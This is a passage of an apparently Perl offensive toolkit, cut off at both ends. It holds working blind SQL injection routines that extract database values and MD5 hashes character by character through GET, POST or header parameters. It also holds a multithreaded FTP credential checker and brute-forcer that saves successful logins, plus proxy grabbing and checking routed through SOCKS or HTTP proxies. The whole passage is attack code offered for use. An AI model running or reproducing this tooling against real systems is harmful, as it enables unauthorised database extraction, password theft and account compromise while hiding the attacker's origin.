return chr(($min-1));
}
}
sub get_res1 {
$max = 255;
$min = 0;
$srd = 127;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$srd)=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}
if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return chr(($max-1));
} else {
return chr(($min-1));
}
}
sub get_res_normal {
$max = 255;
$min = 0;
$srd = 127;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$srd)=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}
if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return ($max-1);
} else {
return ($min-1);
}
}
sub get_res_normal1 {
$max = 255;
$min = 0;
$srd = 127;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),".$srd.")=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}
if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return ($max-1);
} else {
return ($min-1);
}
}
sub md5_turbo {
$max = 108;
$min = 48;
$srd = 75;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$srd)=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}
if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(ascii(mid(" . $bl_current . "," .$ii. ",1)),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return chr(($max-1));
} else {
return chr(($min-1));
}
}
sub get_res_count {
$max = 9;
$min = 0;
$srd = 4;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(mid(" . $bl_current . "," .$ii. ",1),$srd)=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}

if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "and(LEAST(mid(" . $bl_current . "," .$ii. ",1),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return ($max-1);
} else {
return ($min-1);
}
}
sub get_res_count1 {
$max = 9;
$min = 0;
$srd = 4;
if($sql_flag == 0) {$bbbl_url = $bl_url}
if($sql_flag == 1) {$bbbl_url = $sql_post}
if($sql_flag == 2) {$bbbl_url = $sql_header}
while (($max - $min)> 1) {
$bl_query = $bbbl_url . $bl_plus . "(LEAST(mid(" . $bl_current . "," .$ii. ",1),$srd)=" . $srd . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len4 = wr_check()}
if($sql_flag == 1) {$chek_len4 = wr_check_POST()}
if($sql_flag == 2) {$chek_len4 = wr_check_HEADER()}
if($chek_len4 == 1) {
$min = $srd + 1;
} else {
$max = $srd;
}
$srd = int(($max + $min)/2);
}
$bl_query = $bbbl_url . $bl_plus . "(LEAST(mid(" . $bl_current . "," .$ii. ",1),$min)=" . $min . ")" . $bl_filtr;
if($sql_flag == 0) {$chek_len5 = wr_check()}
if($sql_flag == 1) {$chek_len5 = wr_check_POST()}
if($sql_flag == 2) {$chek_len5 = wr_check_HEADER()}
if($chek_len5 == 1) {
return ($max-1);
} else {
return ($min-1);
}
}

sub scan_url_POST {
$res = "";
if($current && $sql_post){
if ($test_mode==1) {
print "===============================================\n";
print "URL: $current\n";
print "POST query: $sql_post\n";
print "===============================================\n";
}
$lsd=length $sql_post;
if ($get_method == 0) {
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "POST $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Content-Length: $lsd\n";
print $socket "Connection: close\n\n";
print $socket $sql_post ."\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
if ($test_mode==1) {print $res}
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "POST $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Content-Length: $lsd\n";
print $socket "Connection: close\n\n";
print $socket $sql_post ."\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
if ($test_mode==1) {print $res}
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "POST $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "Content-Length: $lsd\n"
. "Connection: close\n\n"
. $sql_post ."\n";
} else {
our $query = "POST $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "Content-Length: $lsd\n"
. "Connection: close\n\n"
. $sql_post ."\n";
}
$res = socks_get();
if ($test_mode==1) {print $res}
}
} else {
$res = req($host, $current, 'GET', 0, $ck1);
if ($test_mode==1) {print $res}
}
} else {
use LWP::Simple;
$res = get($current);
if ($test_mode==1) {print $res}
}
return $res;
}
}
sub scan_url_HEADER {
$res = "";
if($current && $sql_header_query){
if ($test_mode==1) {
print "===============================================\n";
print "URL: $current\n";
print "HEADER query: $sql_header_query\n";
print "===============================================\n";
}
if ($get_method == 0) {
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
if ($sql_header) {
print $socket "$sql_header_query\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
if ($test_mode==1) {print $res}
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
if ($sql_header) {
print $socket "$sql_header_query\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
if ($test_mode==1) {print $res}
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
if ($sql_header) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "$sql_header_query\r\n" 
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";

} 

} else {
if ($sql_header) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Content-Type: application/x-www-form-urlencoded\n"
. "$sql_header_query\r\n" 
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";

} 
}
$res = socks_get();
if ($test_mode==1) {print $res}
}
} else {
$res = req($host, $current, 'GET', 0, $ck1);
if ($test_mode==1) {print $res}
}
} else {
use LWP::Simple;
$res = get($current);
if ($test_mode==1) {print $res}
}
return $res;
}
}
sub scan_url {
$res = "";
if($current){
if ($test_mode==1) {
print "===============================================\n";
print "URL: $current\n";
print "===============================================\n";
}
if ($get_method == 0) {
if ($https_flag == 0) {
if ($socks_check == 0) {
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
if ($test_mode==1) {print $res}
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
if ($sql_header) {
print $socket "$sql_header_query\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
if ($test_mode==1) {print $res}
}
}
} else {
$check_url = $current;
$check_host = $host;
if ($cookie) {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Cookie: $cookie\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
} else {
our $query = "$method $check_url HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: " . $referer . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: $user_agent\r\n"
. "Connection: close\r\n\r\n";
}
$res = socks_get();
if ($test_mode==1) {print $res}
}
} else {
$res = req($host, $current, 'GET', 0, $ck1);
if ($test_mode==1) {print $res}
}
} else {
use LWP::Simple;
$res = get($current);
if ($test_mode==1) {print $res}
}
return $res;
}
}
sub grab_proxy {
$res = "";
if ($use_proxy == 0) {
if ($socket=IO::Socket::INET->new( PeerAddr => $host, PeerPort => 80, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
my @ips = $res =~ /([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\:[0-9]+)/g;
my $str = 0;
while ( <@ips>){
print $_,"\n";
if ($_) {print FILE1 $_,"\n"}
$str++;
}
print "-----------------------------------\n";
print "From $host - $str proxy\n";
print "-----------------------------------\n";
}
} else {
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print $socket "$method $current HTTP/1.$http_protocol\n";
print $socket "Host: $host\n";
if ($cookie) {
print $socket "Cookie: $cookie\n";
}
print $socket "Accept: */*\n";
if ($referer) {
print $socket "Http-Referer: $referer\n";
}
if ($user_agent) {
print $socket "User-Agent: $user_agent\n";
}
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";
$socket->autoflush(1);
while (<$socket>) {
$res .= $_ while <$socket>;
}
close $socket;
my @ips = $res =~ /([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\:[0-9]+)/g;
my $str = 0;
while ( <@ips>){
print $_,"\n";
if ($_) {print FILE1 $_,"\n"}
$str++;
}
print "-----------------------------------\n";
print "From $host - $str proxy\n";
print "-----------------------------------\n";
}
}
}
## FTP checker ##
if ($choice == 10) {
open( FILE1, ">>" . $ftp_save); # ???? ??? ?????? ???????????
print "FTP checker starting, wait please....\n";
print "--------------------------------------\n";
open(FILE99, "<", $ftp_list);
while(<FILE99>) {
chomp;
if ($_) {push(@ftp_list, $_);}
}
close(FILE99);
$size = @ftp_list;
$thr500 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$good = 0;
print "Threads - $kol_threads\n";
print "FTP file - ". $ftp_list . " [" . $size ."] records\n";
print "FTP-good file - ". $ftp_save . "\n";
print "FTP default port - ". $ftp_def_port . "\n";
print "FTP timeout - ". $timeout . " sec.\n";
print "Pause - ". $pause . " sec.\n";
print "--------------------------------------\n";
for(0..$thr500) {
$trl500[$_] = threads->create(\&gets500);
}
for(0..$thr500) {
$trl500[$_]->join;
}
sub gets500 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $ftp_list[$num];
$current =~ /^ftp:\/\/?(.*):(.*)\@(.*):(\d+)/img;
$login = $1;
$pass = $2;
$host4 = $3;
$port4 = $4;
if (!$port4) {$port4 = $ftp_def_port;}
if ($host4) {
if ($sock =IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$host4,PeerPort=>$port4,TimeOut => $timeout)) {
$sock_res = "";
$sock_res = <$sock>;
print $sock "USER $login" . $CRLF;
$sock_res = <$sock>;
print $sock "PASS $pass" . $CRLF;
$sock_res = <$sock>;
if ($sock_res !~ /230\s/) {
close($sock);
} else {
$good++;
print " FTP good - " . $good . "\r";
if ($current) {print FILE1 " " . $current . "\n"}
close($sock);
}
}
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . $ftp_save . "\n";
close(FILE1);
goto START_global;
}
## FTP bruter ##
if ($choice == 11) {
print "----------------------------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------------------------\n";
print " [1] Login:password FTP brute - file [$ftp_login_pass_file]\n";
print " [2] Know FTP login, brute passwords - file [$ftp_pass_file]\n";
print " [3] Know FTP password, brute logins - file [$ftp_login_file]\n";
print "----------------------------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice == 1) {
open( FILE1, ">>" . "z_" . $ftp_host . ".txt"); # ???? ??? ?????? ???????????
print "--------------------------------------\n";
print "FTP bruter starting, wait please....\n";
print "--------------------------------------\n";
open(FILE99, "<", $ftp_login_pass_file);
while(<FILE99>) {
chomp;
if ($_) {push(@ftp_login_pass_b, $_);}
}
close(FILE99);
$size = @ftp_login_pass_b;
$thr500 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$good = 0;
print "Threads - $kol_threads\n";
print "FTP login:pass file - ". $ftp_login_pass_file . " [" . $size ."] records\n";
print "FTP save file - z_" . $ftp_host . ".txt\n";
print "FTP host - ". $ftp_host . "\n";
print "FTP port - ". $ftp_def_port_b . "\n";
print "FTP timeout - ". $timeout . " sec.\n";
print "Pause - ". $pause . " sec.\n";
print "--------------------------------------\n";
for(0..$thr500) {
$trl500[$_] = threads->create(\&gets511);
}
for(0..$thr500) {
$trl500[$_]->join;
}
sub gets511 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $ftp_login_pass_b[$num];
($login,$pass) = split(/$ftp_login_pass_del/,$current);
if ($sock =IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$ftp_host,PeerPort=>$ftp_def_port_b,TimeOut => $timeout)) {
$sock_res = "";
$sock_res = <$sock>;
print $sock "USER $login" . $CRLF;
$sock_res = <$sock>;
print $sock "PASS $pass" . $CRLF;
$sock_res = <$sock>;
if ($sock_res !~ /230\s/) {
close($sock);
} else {
print "\n ---> FIND - " . $current . "\n";
print FILE1 " ftp://" . $current . "@" . $ftp_host . ":" . $ftp_def_port_b . "\n";
close($sock);
print "----------\n";
print "Saved in " . "z_" . $ftp_host . ".txt\n";
close(FILE1);
exit;

}
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Cant' find...\n";
close(FILE1);
goto START_global;
}# end choice 1
if ($choice == 2) {
open( FILE1, ">>" . "z_" . $ftp_host . ".txt"); # ???? ??? ?????? ???????????
print "--------------------------------------\n";
print "FTP bruter starting, wait please....\n";
print "--------------------------------------\n";
open(FILE99, "<", $ftp_pass_file);
while(<FILE99>) {
chomp;
if ($_) {push(@ftp_pass_b, $_);}
}
close(FILE99);
$size = @ftp_pass_b;
$thr500 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$good = 0;
print "Threads - $kol_threads\n";
print "FTP passwords file - ". $ftp_pass_file . " [" . $size ."] records\n";
print "FTP save file - z_" . $ftp_host . ".txt\n";
print "FTP host - ". $ftp_host . "\n";
print "FTP port - ". $ftp_def_port_b . "\n";
print "FTP timeout - ". $timeout . " sec.\n";
print "Pause - ". $pause . " sec.\n";
print "--------------------------------------\n";
$login = $ftp_login;
print "--------------------------------------\n";
print "FTP login: [$login] Start password brute... \n";
print "--------------------------------------\n";
for(0..$thr500) {
$trl500[$_] = threads->create(\&gets512);
}
for(0..$thr500) {
$trl500[$_]->join;
}
sub gets512 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$pass = $ftp_pass_b[$num];
if ($sock =IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$ftp_host,PeerPort=>$ftp_def_port_b,TimeOut => $timeout)) {
$sock_res = "";
$sock_res = <$sock>;
print $sock "USER $login" . $CRLF;
$sock_res = <$sock>;
print $sock "PASS $pass" . $CRLF;
$sock_res = <$sock>;
if ($sock_res !~ /230\s/) {
close($sock);
} else {
print "\n ---> FIND - " . $pass . "\n";
print FILE1 " ftp://" . $login . ":" . $pass . "@" . $ftp_host . ":" . $ftp_def_port_b . "\n";
close($sock);
print "----------\n";
print "Saved in " . "z_" . $ftp_host . ".txt\n";
close(FILE1);
exit;
}
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Cant' find...\n";
close(FILE1);
goto START_global;
}# end choice 2
if ($choice == 3) {
open( FILE1, ">>" . "z_" . $ftp_host . ".txt"); # ???? ??? ?????? ???????????
print "--------------------------------------\n";
print "FTP bruter starting, wait please....\n";
print "--------------------------------------\n";
open(FILE99, "<", $ftp_login_file);
while(<FILE99>) {
chomp;
if ($_) {push(@ftp_login_b, $_);}
}
close(FILE99);
$size = @ftp_login_b;
$thr500 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$good = 0;
print "Threads - $kol_threads\n";
print "FTP logins file - ". $ftp_login_file . " [" . $size ."] records\n";
print "FTP save file - z_" . $ftp_host . ".txt\n";
print "FTP host - ". $ftp_host . "\n";
print "FTP port - ". $ftp_def_port_b . "\n";
print "FTP timeout - ". $timeout . " sec.\n";
print "Pause - ". $pause . " sec.\n";
print "--------------------------------------\n";
$pass = $ftp_pass;
print "--------------------------------------\n";
print "FTP pass: [$pass] Start login brute... \n";
print "--------------------------------------\n";
for(0..$thr500) {
$trl500[$_] = threads->create(\&gets513);
}
for(0..$thr500) {
$trl500[$_]->join;
}
sub gets513 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$login = $ftp_login_b[$num];
if ($sock =IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$ftp_host,PeerPort=>$ftp_def_port_b,TimeOut => $timeout)) {
$sock_res = "";
$sock_res = <$sock>;
print $sock "USER $login" . $CRLF;
$sock_res = <$sock>;
print $sock "PASS $pass" . $CRLF;
$sock_res = <$sock>;
if ($sock_res !~ /230\s/) {
close($sock);
} else {
print "\n ---> FIND - " . $login . "\n";
print FILE1 " ftp://" . $login . ":" . $pass . "@" . $ftp_host . ":" . $ftp_def_port_b . "\n";
close($sock);
print "----------\n";
print "Saved in " . "z_" . $ftp_host . ".txt\n";
close(FILE1);
exit;
}
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Cant' find...\n";
close(FILE1);
goto START_global;
}# end choice 3

}
## PROXY checker ##
if ($choice == 12) {
open( FILE1, ">>" . $proxy_save); # ???? ??? ?????? ???????????
print "PROXY checker starting, wait please....\n";
print "--------------------------------------\n";
open(FILE100, "<", $proxy_list);
while(<FILE100>) {
chomp;
if ($_) {push(@proxy_list, $_);}
}
close(FILE100);
$size = @proxy_list;
$thr501 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$good = 0;
print "Threads - $kol_threads\n";
print "PROXY file - ". $proxy_list . " [" . $size ."] records\n";
print "PROXY-good file - ". $proxy_save . "\n";
print "PROXY timeout - ". $timeout . " sec.\n";
print "Pause - ". $pause . " sec.\n";
print "--------------------------------------\n";
for(0..$thr501) {
$trl501[$_] = threads->create(\&gets501);
}
for(0..$thr501) {
$trl501[$_]->join;
}
sub gets501 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current_proxy = $proxy_list[$num];
($current_proxy_host,$current_proxy_port) = split(/:/,$current_proxy);
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
$good++;
print " PROXY good - " . $good . "\r";
if ($current_proxy) {print FILE1 " " . $current_proxy . "\n"}
close($sock);
}
}
print $num . "\r";
sleep $pause;

}
print "----------\n";
print "Saved in " . $proxy_save . "\n";
close(FILE1);
goto START_global;
}
## Proxy grabber ##
if ($choice == 13) {
open( FILE1, ">>" . $proxy_list); # ???? ??? ?????? ???????????
open(FILE, "<", $proxy_site_list);
while(<FILE>) {
chomp;
if ($_) {push(@proxy_grab, $_);}
}
close(FILE);
$size = @proxy_grab;
print "Sites with proxy - $size\n";
print "--------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets3000);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets3000 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $proxy_grab[$num];
$current =~ /^http:\/\/?([^\/]+)/i;
$host = $1;
$content = grab_proxy();
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . $proxy_list . "\n";
close(FILE1);
goto START_global;
}

if ($choice == 14) {
exit;
}
sub gets1000 {
my $num1 : shared;
$thr1 = 1;
$num1 = 0;
%res = ();
for(0..$thr1) {
$trl1[$_] = threads->create(\&gets1001);
}
for(0..$thr1) {
%res = (%res, %{$trl1[$_]->join});
}
sub gets1001 {
$| = 1;
$ii = 0;
while ($num1 < $bl_lenght) {
{ lock($num1);
$num1++; }
$ii = $num1;
$data = get_res();
$hash{$ii} = $data;
print $data;
}
return \%hash
}
return \%res;
}
sub gets1005 {

my $num2 : shared;
$thr2 = 10;
$num2 = 0;
%res1 = ();
for(0..$thr2) {
$trl2[$_] = threads->create(\&gets1006);
}
for(0..$thr2) {
%res1 = (%res1, %{$trl2[$_]->join});
}
sub gets1006 {
$| = 1;
$ii = 0;
while ($num2 < $bl_lenght) {
{ lock($num2);
$num2++; }
$ii = $num2;
if ($bl_mode==0){
$data2 = get_res();
} else {
$data2 = get_res1();
}
$hash1{$ii} = $data2;
print $data2;
}
return \%hash1
}
return \%res1;

}
sub md5 {
my $num3 : shared;
$thr3 = 10;
$num4 = 0;
%res2 = ();
for(0..$thr3) {
$trl3[$_] = threads->create(\&gets1008);
}
for(0..$thr3) {
%res2 = (%res2, %{$trl3[$_]->join});
}
sub gets1008 {
$| = 1;
$ii = 0;
while ($num3 < $bl_lenght) {
{ lock($num3);
$num3++; }
$ii = $num3;
$data3 = md5_turbo();
$hash2{$ii} = $data3;
print $data3;
}
return \%hash2
}
return \%res2;
}
sub TURBO {
my $num4 : shared;
$thr4 = 10;
$num4 = 0;
%res4 = ();
for(0..$thr4) {
$trl4[$_] = threads->create(\&gets1009);
}
for(0..$thr4) {
%res4 = (%res4, %{$trl4[$_]->join});
}
sub gets1009 {
$| = 1;
$ii = 0;
while ($num4 < $bl_lenght) {
{ lock($num4);
$num4++; }
$ii = $num4;
$data4 = get_res();
$hash4{$ii} = $data4;
print $data4;
}
return \%hash4
}
return \%res4;
}
sub socks_check {
$check_port = 80;
$check_host = $check_url;
my $check_hostent = gethostbyname ($check_host);
our $sk4_conn = "\x04"
. "\x01"
. pack ('n', $check_port)
. $check_hostent
. "\x00";
our $sk5_conn0 = "\x05"
. "\x01"
. "\x00";
our $sk5_conn1 = "\x05"
. "\x01"
. "\x00"
. "\x01"
. $check_hostent
. pack ('n', $check_port);
my @proxies;
open(FILE, "<", $socks_file);
while(<FILE>) {
chomp;
push(@proxies, $_);
}
close(FILE);
foreach my $proxy (<@proxies>) {
$sokcs_flag = 0;
